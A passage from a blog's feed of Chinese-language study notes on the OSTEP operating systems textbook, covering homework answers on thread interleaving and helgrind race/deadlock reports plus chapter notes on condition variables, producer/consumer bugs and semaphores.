 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.main</span><br><span class="line">.top</span><br><span class="line"># &lt;-- critical section begin --&gt;</span><br><span class="line">mov 2000, %ax</span><br><span class="line">add $1, %ax</span><br><span class="line">mov %ax, 2000</span><br><span class="line"># &lt;--  critical section end  --&gt;</span><br><span class="line">sub $1, %bx</span><br><span class="line">test $0, %bx</span><br><span class="line">jgt .top</span><br><span class="line">halt</span><br></pre></td></tr></table></figure></li>
<li><p>中断步长为 1 和 2 时无法获得正确的结果 (临界区域交织)。在只循环一次的情况下，中断步长大于等于 3 即可保证结果正确。</p>
</li>
<li><p>保证执行结果正确有以下几种思路：</p>
<ul>
<li>只要设置 <code>-i</code> 参数足够大以使得两个线程串行地执行，就可以保证结果正确。</li>
<li>该汇编代码执行一个循环一共有 6 条语句，其中临界区域有 3 条语句。因此只要设置 <code>-i</code> 参数为 3 的倍数，就可以保证临界区域不会交叉。</li>
</ul>
<p> 对于那些不是 3 的倍数的参数，在参数较小时尚可预估 (比如如果设置 <code>-i 1/2</code>，则每个临界区域都会交织，最后答案为 N，<code>-i 4</code> 最后的结果会是 3N/2 上取整)，参数较大时得到的结果就难以理解了。</p>
</li>
<li><p><code>wait-for-me.s</code> 代码会根据 %ax 的值选择 waiter 或 signaller 身份。waiter 等待地址 2000 处值为 1结束，signaller 负责向 2000 处放一个 1。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.main</span><br><span class="line">test $1, %ax     # ax should be 1 (signaller) or 0 (waiter)</span><br><span class="line">je .signaller</span><br><span class="line"></span><br><span class="line">.waiter	</span><br><span class="line">mov  2000, %cx</span><br><span class="line">test $1, %cx</span><br><span class="line">jne .waiter</span><br><span class="line">halt</span><br><span class="line"></span><br><span class="line">.signaller</span><br><span class="line">mov  $1, 2000</span><br><span class="line">halt</span><br></pre></td></tr></table></figure>

<p> 运行指令后会看到第一个线程放 1 结束，第二个线程看到有 1 结束。</p>
</li>
<li><p>如果反过来，则会看到线程 1 在轮询地址 2000 处的值，直到发生线程切换，线程 2 向 2000 处填写了 1，线程 1 才得以退出。这是自旋锁的雏形。如果将 <code>-i</code> 调得很大，线程 1 将浪费 CPU cycle 进行大量轮询。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Homework</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 27 - Homework</title>
    <url>/2022/02/25/OSTEP/OSTEP%20Homework%2027/</url>
    <content><![CDATA[<h2 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h2><ol>
<li>First build main-race.c. Examine the code so you can see the (hopefully obvious) data race in the code. Now run helgrind (by typing valgrind –tool=helgrind main-race) to see how it reports the race. Does it<br>point to the right lines of code? What other information does it give to you? <span id="more"></span></li>
<li>What happens when you remove one of the offending lines of code? Now add a lock around one of the updates to the shared variable, and then around both. What does helgrind report in each of these cases?</li>
<li>Now let’s look at main-deadlock.c. Examine the code. This code has a problem known as deadlock (which we discuss in much more depth in a forthcoming chapter). Can you see what problem it might have?</li>
<li>Now run helgrind on this code. What does helgrind report?</li>
<li>Now run helgrind on main-deadlock-global.c. Examine the code; does it have the same problem that main-deadlock.c has? Should helgrind be reporting the same error? What does this tell you about tools like helgrind?</li>
<li>Let’s next look at main-signal.c. This code uses a variable (done) to signal that the child is done and that the parent can now continue. Why is this code inefficient? (what does the parent end up spending its time doing, particularly if the child thread takes a long time to complete?)</li>
<li>Now run helgrind on this program. What does it report? Is the code correct?</li>
<li>Now look at a slightly modified version of the code, which is found in main-signal-cv.c. This version uses a condition variable to do the signaling (and associated lock). Why is this code preferred to the previous<br>version? Is it correctness, or performance, or both?</li>
<li>Once again run helgrind on main-signal-cv. Does it report any errors?</li>
</ol>
<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><ol>
<li><p>helgrind 工具可以准确地报告出 <code>main-race.c</code> 的第 15 行和第 8 行的操作存在 data race。此外，helgrind 可以报告出产生数据竞争的地址 (0 bytes inside data symbol “balance”)，还可以报告线程创建的过程：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---Thread-Announcement------------------------------------------</span><br><span class="line">Thread #2 was created</span><br><span class="line">   at 0x49A9D42: clone (clone.S:71)</span><br><span class="line">   by 0x4878281: create_thread (createthread.c:103)</span><br><span class="line">   by 0x4879C8B: pthread_create@@GLIBC_2.2.5 (pthread_create.c:821)</span><br><span class="line">   by 0x484D627: ??? (in /usr/libexec/valgrind/vgpreload_helgrind-amd64-linux.so)</span><br><span class="line">   by 0x109209: main (main-race.c:14)</span><br></pre></td></tr></table></figure></li>
<li><p>如果删除掉任意一个对 balance 的操作，helgrind 就不会报告错误。如果只用锁保护一处操作，helgrind 仍然会报告 data race (且能报告处哪一处操作被锁保护了)。如果用锁将两处操作都保护了，helgrind 不会报告错误。</p>
</li>
<li><p><code>main-deadlock.c</code> 存在发生死锁的风险：如果 p1 线程获得了锁 m1，然后 p2 线程获得了锁 m2，这时 p1 线程试图获得锁 m2，p2 线程试图获得锁 m1，它们都得不到需要的锁，也不会释放自己已经得到的锁，从而陷入死锁。</p>
</li>
<li><p>helgrind 会报告形如下面所示的错误：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Thread #3: lock order &quot;0x10C040 before 0x10C080&quot; violated</span><br><span class="line"></span><br><span class="line">Observed (incorrect) order is: acquisition of lock at 0x10C080</span><br><span class="line"> ...</span><br><span class="line"> followed by a later acquisition of lock at 0x10C040</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">Required order was established by acquisition of lock at 0x10C040</span><br><span class="line"> ...</span><br><span class="line"> followed by a later acquisition of lock at 0x10C080</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">Lock at 0x10C040 was first observed</span><br><span class="line"> ...</span><br><span class="line"> Address 0x10c040 is 0 bytes inside data symbol &quot;m1&quot;</span><br><span class="line"></span><br><span class="line">Lock at 0x10C080 was first observed</span><br><span class="line"> ...</span><br><span class="line"> Address 0x10c080 is 0 bytes inside data symbol &quot;m2&quot;</span><br></pre></td></tr></table></figure>

<p> 对于程序中的任意两个锁，所有获取锁的行为都一定要按照相同的顺序，否则就有可能引发死锁。helgrind 根据这个原理检测到了可能存在的死锁，并且给出了两次不同的顺序以及锁的名称。</p>
<blockquote>
<p><strong>为什么我无法使死锁暴露出来？</strong></p>
<p>两个线程的创建是有时间差的，新创建的线程可以利用这个时间差把两个锁都得到，这样死锁就不会暴露出来。</p>
<p>为了更好地观测死锁现象，我们可以在 worker() 函数的开头添加一句 <code>usleep(1)</code>，这会让线程在此处等待至少 1 微秒的时间。考虑到系统活动等因素，<code>usleep(1)</code> 其实会带来一段时长比较随机的 delay，这让两个线程被拉回“同一起跑线”的几率大大增加。此外，多次重复实验，即可比较容易地观察到死锁现象。</p>
</blockquote>
</li>
<li><p><code>main-deadlock-global.c</code> 中由于有一个外层的大锁保护，所以不会发生死锁。但使用 helgrind 检查仍然和会报告有非法的锁获得顺序问题。helgrind 只是记录访问锁的顺序并判断是否出现了环，并不能准确地判断死锁是否可能发生。</p>
</li>
<li><p>主线程在子线程打印的时候会轮询 done 变量，让 CPU 空转，所以这个方法是不高效的。</p>
</li>
<li><p>helgrind 报告该程序存在数据竞争。两个线程对 done 的读写没有用锁保护起来，存在 race condition。</p>
</li>
<li><p><code>main-signal-cv.c</code> 相较于前者有两个改进：一是两个进程对 done 变量的访问都用锁保护了起来，保证了不会发生 race condition；二是该程序使用了条件变量，如果主线程检查 done 结果为 0，会在条件变量上睡眠，睡眠的线程可以被 CPU 调度出去，从而不占据 CPU 时钟周期。等到子线程打印完了唤醒条件变量，主线程再来检查 done 变量并打印自己的内容。</p>
</li>
<li><p>helgrind 没有报告任何错误。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Homework</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 30: Condition Variables</title>
    <url>/2022/02/22/OSTEP/OSTEP%20Chapter%2030%20-%20Condition%20Variables/</url>
    <content><![CDATA[<p>很多时候，我们有一个任务等待另一个任务的需求，比如主线程等到子线程结束后再继续执行 (这个函数通常被称为 join() )。一个朴素的想法是利用一个共享变量实现：<span id="more"></span></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> done = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">child</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    do_something();</span><br><span class="line">    done = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> c;</span><br><span class="line">    Pthread_create(&amp;c, <span class="literal">NULL</span>, child, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">while</span> (done == <span class="number">0</span>)</span><br><span class="line">        ;</span><br><span class="line">    do_something_else();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但这样做主线程会在 done 变量上不停地自旋，占 CPU 不干活。我们希望有更高效的实现方法。</p>
<h2 id="30-1-Definition-and-Routines"><a href="#30-1-Definition-and-Routines" class="headerlink" title="30.1 Definition and Routines"></a>30.1 Definition and Routines</h2><p>为了让一个线程等待一个条件成立，我们通常使用条件变量 (condition variable)。条件变量可以理解为一个显式的队列，线程可以将自己加入到这个队列中挂起，当其他线程的操作使得条件变化时，它会唤醒这个“队列”中的线程。我们提供两个 API：<code>wait()</code> 可以让线程将自己加入到队列中等待；<code>signal()</code> 可以让别的线程改变了条件状态时向队列中的线程“发送信号”。</p>
<p>POSIX 提供的条件变量 API 为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_wait</span><span class="params">(<span class="keyword">pthread_cont_t</span> *c, <span class="keyword">pthread_mutex_t</span> *m)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cond_signal</span><span class="params">(<span class="keyword">pthread_cond_t</span> *c)</span></span>;</span><br></pre></td></tr></table></figure>

<p>注意到 wait() 的参数中除了条件变量 c 还有一个自旋锁 m。wait() 的语义要求调用时线程必须拥有自旋锁 m，wait() 会负责释放这个自旋锁并使当前线程进入睡眠状态 (这两步是原子的)；当 signal() 使当前线程被唤醒后，wait() 会负责让线程重新获得自旋锁 m，然后返回。</p>
<p><a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2030%20-%20threads_cv/join.c">join.c</a> 提供了一个主线程等待子线程结束的正确实现。事实上这个过程是很容易实现错的，比如如下一些写法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thr_exit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;m);</span><br><span class="line">    Pthread_cond_signal(&amp;c);</span><br><span class="line">    Pthread_mutex_unlock(&amp;m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thr_join</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Pthread_mutex_lock(&amp;m);</span><br><span class="line">    Pthread_cond_wait(&amp;c, &amp;m);</span><br><span class="line">    Pthread_mutex_unlock(&amp;m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个写法只有在 thr_join() 在 thr_exit() 之前执行的情况下才是正确的。如果颠倒了顺序，thr_join() 将永远不会被唤醒 (<a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2030%20-%20threads_cv/join_no_state_var.c">join_no_state_var.c</a> 中，主线程里使用了 sleep() 以精确复现这一情形)。因此我们可以看到，使用条件变量时理应有一个条件状态的判断。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thr_exit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    done = <span class="number">1</span>;</span><br><span class="line">    Pthread_cond_signal(&amp;c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">thr_join</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (done == <span class="number">0</span>)</span><br><span class="line">        Pthread_cond_wait(&amp;c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个写法没有用锁保护状态变量 done 的读写，缺失了原子性。这里的原子性缺失指的是：虽然在 while 判断时 <code>done == 0</code>，但在 wait() 时 done 可能已经不等于 0 了。考虑这样一种执行流：thr_join() 做完 while 判断进入循环，还没来得及 wait() 时，执行流被打断，thr_exit() 执行并 signal()，但此时队列中并没有线程。接着 thr_join() 继续执行陷入睡眠，那么它将永远不会被唤醒 (<a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2030%20-%20threads_cv/join_no_lock.c">join_no_lock()</a> 中在主线程使用了比子线程时间更长的 sleep() 以精确复现这一情况)。</p>
<blockquote>
<p><strong>Tip: Always Hold The Lock While Signaling</strong></p>
<p>POSIX 的 wait() 函数的语义已经要求了我们在调用 wait() 时必须要拥有自旋锁；虽然少数情况下我们可以无锁地调用 signal()，但为了安全和简单，我们应当在 signal() 时也用自旋锁保护。</p>
</blockquote>
<h2 id="30-2-The-Producer-Consumer-Bounded-Buffer-Problem"><a href="#30-2-The-Producer-Consumer-Bounded-Buffer-Problem" class="headerlink" title="30.2 The Producer/Consumer (Bounded Buffer) Problem"></a>30.2 The Producer/Consumer (Bounded Buffer) Problem</h2><p>生产者-消费者问题在系统中很常见，比如下面的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep foo file.txt | wc -l</span><br></pre></td></tr></table></figure>

<p>grep 找到的内容通过管道传送给 wc 统计个数。管道在内核中就是一个缓冲区，因此这里 grep 是一个生产者，wc 是一个消费者，wc 不能在 buffer 为空的时候从管道里读东西，grep 也不能在缓冲区满了的时候再往里填。</p>
<h3 id="A-Broken-Solution"><a href="#A-Broken-Solution" class="headerlink" title="A Broken Solution"></a>A Broken Solution</h3><p>一个比较自然但却错误的实现如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">producer</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LOOP; i++) &#123;</span><br><span class="line">        lock(&amp;lk);</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">1</span>) wait(&amp;cond, &amp;lk);</span><br><span class="line">        put(i); <span class="comment">// count becomes 1</span></span><br><span class="line">        signal(&amp;cond);</span><br><span class="line">        unlock(&amp;lk);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">consumer</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        lock(&amp;lk);</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>) wait(&amp;cond, &amp;lk);</span><br><span class="line">        <span class="keyword">int</span> rt = get(); <span class="comment">// count becomes 0</span></span><br><span class="line">        signal(&amp;cond);</span><br><span class="line">        unlock(&amp;lk);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, rt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果只有一个生产者线程和一个消费者线程，这个实现是正确的。但如果有多个，比如一个生产者和两个消费者，就会有并发 bug。考虑如下执行过程：</p>
<ul>
<li>$T_{c_1}$ 运行，发现 <code>count == 0</code>，挂起；</li>
<li>$T_p$ 运行，往 buffer 里放了一个数，然后通过 signal() 唤醒 $T_{c_1}$。</li>
<li>$T_{c_1}$ 刚被唤醒，还没来得及获得自旋锁返回的时候，$T_{c_2}$ 运行，从 buffer 里取走了这个数打印；</li>
<li>这时返回到 $T_{c_1}$，获得自旋锁返回后，由于之前的判断是 if 语句，它无法发现 count 此时又变成 0 了，于时再次从 buffer 中取数，触发 assertion fail。</li>
</ul>
<p>并发 bug 产生的原因是：从消费者线程被唤醒到消费者线程真正获得自旋锁开始工作这段时间内，buffer 的状态改变了。<strong>signal() 的语义只是通知一个正在等待的线程：世界的状态改变了，但它不保证世界的状态被改变成了调用 signal() 之前那一瞬的状态。</strong> 这种 signal() 的语义被称为 <strong>Mesa semantics</strong>。与之相对的是 <strong>Hoare Semantics</strong>，它保证调用 signal() 之后一个线程被唤醒并立即被执行 (原子性)。但后者难实现的多，现在绝大部分系统的 signal() 使用的都是 Mesa semantics。</p>
<h3 id="Better-But-Still-Broken-While-Not-If"><a href="#Better-But-Still-Broken-While-Not-If" class="headerlink" title="Better, But Still Broken: While, Not If"></a>Better, But Still Broken: While, Not If</h3><p>Mesa semantics 是比较容易克服的：我们只要将上面程序中对状态变量做判断的 if 换成 while 即可。这样即使被唤醒后状态又被改变，线程获得自旋锁后会再次检查状态，发现不对后可以再次进入睡眠。</p>
<blockquote>
<p><strong>Always use while loops when working with condition variables!</strong></p>
</blockquote>
<p>但即使将 if 改成 while，我们的程序仍然有并发 bug。考虑如下执行过程：</p>
<ul>
<li>$T_{c_1}$ 运行，发现 <code>count == 0</code>，挂起；</li>
<li>$T_{c_2}$ 运行，发现 <code>count == 0</code>，挂起；</li>
<li>$T_p$ 运行，往 buffer 里添加了一个数字，然后通过 signal() 唤醒了 $T_{c_1}$。唤醒后 $T_{c_1}$ 并未立刻执行，而是 $T_p$ 继续运行，第二次循环时 $T_p$ 发现 <code>count == 1</code>，挂起；</li>
<li>$T_{c_1}$ 运行，从 buffer 里读取了一个数字 (count 变为 0) 然后通过 signal() 唤醒一个线程。注意此时睡眠在条件变量上的线程有 $T_p$ 和 $T_{c_2}$ 两个。$T_{c_1}$ 选择唤醒 $T_{c_2}$。</li>
<li>$T_{c_1}$ 和 $T_{c_2}$ 都发现没有数据可读，挂起。</li>
</ul>
<p>到这里，三个线程全部陷入睡眠，程序停滞。从这个例子中我们可以看出：消费者线程消费完后应该唤醒生产者线程；生产者线程生产完后应该唤醒消费者线程，我们应该有两个条件变量。</p>
<h3 id="The-Correct-Producer-Consumer-Solution"><a href="#The-Correct-Producer-Consumer-Solution" class="headerlink" title="The Correct Producer/Consumer Solution"></a>The Correct Producer/Consumer Solution</h3><p>pc.c 提供了一个完整、正确的生产者-消费者实现，其中的要点如下：</p>
<ul>
<li>使用两个条件变量，保证消费者只能唤醒生产者，生产者只能唤醒消费者。</li>
<li>判断状态变量使用 while 语句。</li>
<li>使用一个循环数组作为 buffer，count 的上限不再是 1 而是一个指定的 max，这使得 buffer 有了一定的容量。</li>
<li>这是一个单生产者-多消费者的程序，生产者最后为每个消费者准备了一个 -1，以保证消费者线程能够全部退出。</li>
</ul>
<blockquote>
<p><strong>Tip: Use While (Not If) for Conditions</strong></p>
<p>使用 while 总是对的，在少数场合下使用 if 也可以达到目的，但为了安全性最好通通使用 while。</p>
<p>我们推荐使用 while 而不是 if 的另一个原因是：一些实现的有问题的 signal() 可能会唤醒不止一个等待的线程。这种情况下，while 仍然能帮我们保证正确。</p>
</blockquote>
<h2 id="30-3-Covering-Conditions"><a href="#30-3-Covering-Conditions" class="headerlink" title="30.3 Covering Conditions"></a>30.3 Covering Conditions</h2><p>假设我们希望用条件变量实现一个内存分配器，alloc() 时如果剩余内存不足则挂起，一段伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> bytesLeft = MAX_HEAP_SIZE;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">allocate</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    lock(&amp;lk);</span><br><span class="line">    <span class="keyword">while</span> (bytesLeft &lt; size)</span><br><span class="line">        wait(&amp;cond, &amp;lk);</span><br><span class="line">    <span class="keyword">void</span> *ptr = GetMemoryFromHeap(size);</span><br><span class="line">    bytesLeft -= size;</span><br><span class="line">    unlock(&amp;lk);</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *ptr, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    lock(&amp;lk);</span><br><span class="line">    bytesLeft += size;</span><br><span class="line">    FreeMemoryToHeap(ptr, size);</span><br><span class="line">    signal(&amp;cond);</span><br><span class="line">    unlock(&amp;lk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们有一个 <code>alloc(100)</code> 和 <code>alloc(10)</code> 处于睡眠状态，现在来了一个 <code>free(50)</code>，问题出现了：如果我们随意挑一个线程唤醒，假如挑了 <code>alloc(100)</code> 的那个，分配还是会失败，且我们错过了让 <code>alloc(10)</code> 成功的机会。一种解决方案是：用一个 broadcast() 函数替代 signal() 函数，它可以唤醒睡眠在条件变量上的所有线程。这种方式被称为 covering conditions。</p>
<p>broadcast() 相较于 signal() 的坏处在于：并不是所有的线程都能在被唤醒后运行下去，比如现在 buffer 里只有一个字符，而 broadcast() 唤醒了 100 个消费者，那么只有一个消费者能得到字符。运行不下去的字符会释放锁并再次进入睡眠，这种无谓打搅了睡眠线程的方式对性能影响很大。</p>
<p>正因如此，虽然我们在之前的生产者-消费者问题中可以使用一个条件变量+broadcast 的方式解决问题，但那时我们显然有很简单的 2-条件变量解决方案，所以不考虑这种效率较低的方式。不过在内存分配的场景中，broadcast() 几乎是唯一的选择。</p>
<h2 id="30-4-Summary"><a href="#30-4-Summary" class="headerlink" title="30.4 Summary"></a>30.4 Summary</h2><p>略。</p>
]]></content>
      <categories>
        <category>WISC-CS537 Introduction to Operating Systems</category>
        <category>Book Notes</category>
      </categories>
  </entry>
  <entry>
    <title>OSTEP Chapter 31: Semaphores</title>
    <url>/2022/02/21/OSTEP/OSTEP%20Chapter%2031%20-%20Semaphores/</url>
    <content><![CDATA[<p>信号量的概念最早由 Dijkstra 提出，它既可以作为锁使用也可以作为条件变量使用。<span id="more"></span></p>
<h2 id="31-1-Semaphores-A-Definition"><a href="#31-1-Semaphores-A-Definition" class="headerlink" title="31.1 Semaphores: A Definition"></a>31.1 Semaphores: A Definition</h2><p>使用一个信号量之前我们要定义其初始值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="keyword">sem_t</span> s;</span><br><span class="line">sem_init(&amp;s, <span class="number">0</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>sem_init() 的第一个参数是信号量，第三个参数是初始值，第二个参数为 0 表示该信号量在同进程下的所有线程之间共享 (如果想让信号量在不同进程之间共享，可以设置为其他数值)。</p>
<p>POSIX 标准提供了信号量操作相关的 API：<code>sem_wait()</code> 和 <code>sem_post()</code>。相较于条件变量，信号量使用起来非常简单：我们不需要关注什么时候获得锁，用 while 还是 if 等问题，在用户层面我们可以认为这些 API 都是原子的。它们的语义可以用如下伪代码描述：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sem_wait</span><span class="params">(<span class="keyword">sem_t</span> *s)</span> </span>&#123;</span><br><span class="line">    decrement the value of s by one;</span><br><span class="line">    wait <span class="keyword">if</span> value of s is negative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sem_post</span><span class="params">(<span class="keyword">sem_t</span> *s)</span> </span>&#123;</span><br><span class="line">    increment the value of s by one;</span><br><span class="line">    <span class="keyword">if</span> there are one <span class="keyword">or</span> more threads waiting, wake one;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当 s 的值为正时，其意义是剩余的资源量；当 s 的值为负时，其意义是当前正在等待的线程数量。</p>
<p>(注：不同于锁，sem_post() 并不需要一个线程曾经调用过 sem_wait()，这相当于线程可以凭空“创造”一份资源。因此使用时一定要格外小心，注意 sem_wait() 和 sem_post() 的对应。)</p>
<h2 id="31-2-Binary-Semaphores-Locks"><a href="#31-2-Binary-Semaphores-Locks" class="headerlink" title="31.2 Binary Semaphores (Locks)"></a>31.2 Binary Semaphores (Locks)</h2><p>信号量可以当作锁来使用，这种信号量被称为 binary semaphore。<a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2031%20-%20threads_sema/binary.c">binary.c</a> 展示了具体的实现。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sem_t</span> m;</span><br><span class="line">sem_init(&amp;m, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">sem_wait(&amp;m);</span><br><span class="line"><span class="comment">// critical section</span></span><br><span class="line">sem_post(&amp;m);</span><br></pre></td></tr></table></figure>

<p>信号量的初始值设置为 1，我们可以把它想象成一个单位的资源 (任何时刻只能上一把锁)。考虑一个 lock contention 的情况：</p>
<ul>
<li>线程 1 调用 sem_wait()，m 的值变为 0，线程 1 成功进入临界区域。</li>
<li>线程 2 调用 sem_wait()，m 的值变为 -1，该线程进入等待序列。</li>
<li>线程 3 调用 sem_wait()，m 的值变为 -2，该线程进入等待序列。</li>
<li>线程 1 离开临界区域，调用 sem_post()，m 的值变为 -1，线程 1 唤醒一个等待序列里的线程 (假设是线程 2) 继续执行。线程 2 成功进入临界区域。</li>
<li>线程 2 离开临界区域，调用 sem_post()，m 的值变为 0，线程 2 唤醒线程 3，线程 3 成功进入临界区域。</li>
<li>线程 3 离开临界区域，调用 sem_post()，m 的值恢复为 1 (锁当前空闲)，线程 3 没有唤醒任务。</li>
</ul>
<p>用信号量实现的锁是 sleep lock 而不是 spinlock。</p>
<h2 id="31-3-Semaphores-For-Ordering"><a href="#31-3-Semaphores-For-Ordering" class="headerlink" title="31.3 Semaphores For Ordering"></a>31.3 Semaphores For Ordering</h2><p>信号量可以用来实现等待 (类似于 join() 的功能)。这时信号量的初始值应当被设为 0。在等待的线程中使用 sem_wait()，在被等待的线程结尾使用 sem_post()。<a href="https://github.com/Kristoff-starling/OSTEP/blob/master/bookcode/Chapter%2031%20-%20threads_sema/join.c">join.c</a> 给出了具体的实现。</p>
<p>我们分析两种可能的情况：</p>
<ul>
<li>主线程在子线程结束之前调用 sem_wait()，此时信号量的值变为 -1，主线程被挂起。待子进程执行结束后，调用 sem_post()，信号量的值恢复为 0，并唤醒等待的主线程继续执行。</li>
<li>主线程在子线程结束之后调用 sem_wait()，那么子线程结束时调用 sem_post() 后，信号量的值变为 1。主线程调用 sem_wait()，信号量的值恢复为 0，因为非负，所以主线程可以直接继续执行。</li>
</ul>
<h2 id="31-4-The-Producer-Consumer-Bounded-Buffer-Problem"><a href="#31-4-The-Producer-Consumer-Bounded-Buffer-Problem" class="headerlink" title="31.4 The Producer/Consumer (Bounded Buffer) Problem"></a>31.4 The Producer/Consumer (Bounded Buffer) Problem</h2><p>最直接的想法是将之前双条件变量的生产者-消费者模型直接套用过来：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;buffer[fill] = val; fill = (fill + <span class="number">1</span>) % MAX;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123;<span class="keyword">int</span> rt = buffer[use]; use = (use + <span class="number">1</span>) % MAX; <span class="keyword">return</span> rt;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">producer</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LOOP; i++) &#123;</span><br><span class="line">        sem_wait(&amp;empty);</span><br><span class="line">        put(i);</span><br><span class="line">        sem_post(&amp;full);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">consumer</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        sem_wait(&amp;full);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, get());</span><br><span class="line">        sem_post(&amp;empty);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">sem_init(&amp;empty, <span class="number">0</span>, MAX);</span><br><span class="line">sem_init(&amp;full, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这个做法在 <code>MAX=1</code> 时是可以正确执行的，但 MAX 大于等于 2 时会出现并发 bug。考虑两个生产者线程并发执行的过程：T1 执行完 sem_wait() 之后进入函数 put()，刚将 val 放进 buffer，还没有来得及给 fill +1 时，T1 被打断，T2 开始执行，因为 MAX&gt;=2，这时 empty 不为 0，T2 可以顺利进入 put()，这时发生了问题：T1 放进 buffer 的内容被 T2 的内容覆盖了。</p>
